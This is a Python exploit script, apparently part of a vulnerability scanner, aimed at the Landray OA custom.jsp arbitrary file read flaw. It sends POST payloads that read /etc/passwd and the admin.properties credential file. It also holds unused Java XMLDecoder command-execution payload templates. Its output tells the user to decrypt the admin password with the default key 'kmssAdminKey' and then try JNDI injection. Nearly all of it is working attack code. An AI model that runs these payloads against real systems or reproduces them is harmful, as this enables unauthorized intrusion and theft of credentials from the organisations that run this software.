import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

payload_template_processbuilder = '<?xml version="1.0" encoding="UTF-8"?> <java version="1.7.0_21" class="java.beans.XMLDecoder"> <void class="java.lang.ProcessBuilder"> <array class="java.lang.String" length="{0}">Template</array> <void method="start" id="process"> </void> </void> </java>'
payload_template_runtime = '<?xml version="1.0" encoding="UTF-8"?> <java version="1.7.0_21" class="java.beans.XMLDecoder"> <object class="java.lang.Runtime" method="getRuntime"> <void method="exec"> <array class="java.lang.String" length="{0}"> Template </array> </void> </object> </java>'


def 蓝凌OA_custom_任意文件读取(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip",
    }
    data = 'var={"body": {"file": "file:///etc/passwd"}}'
    data1 = 'var={"body": {"file": "/WEB-INF/KmssConfig/admin.properties"}}'
    exp_url = urldata + "/sys/ui/extend/varkind/custom.jsp"
    try:
        requests.packages.urllib3.disable_warnings()
        respones1 = requests.post(exp_url, headers=headers, data=data, verify=False)
        respones2 = requests.post(exp_url, headers=headers, data=data1, verify=False)
        if (respones1.status_code == 200 and 'root:' in respones1.text) or (
                respones2.status_code == 200 and 'password' in respones2.text):
            print(Vcolors.RED + "[+] 蓝凌OA custom.jsp 任意文件读取漏洞存在:{}".format(exp_url)+ Vcolors.ENDC)
            print(Vcolors.RED + "[+] post输入的参数为:{}".format(data) + Vcolors.ENDC)
            print(Vcolors.RED + "[+] post输入的参数为:{}".format(data1) + Vcolors.ENDC)
            print(Vcolors.RED + "[+] 蓝凌OA custom.jsp 任意文件读取漏洞存在:{}".format(exp_url) + Vcolors.ENDC)
            print(Vcolors.RED + "[+] 请手工测试返回值，若存在admin.properties AES加密，且 默认密钥为 kmssAdminKey 登录后台可进行jndi注入测试" + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 蓝凌OA custom.jsp 任意文件读取漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("蓝凌OA_custom_任意文件读取脚本出现异常")

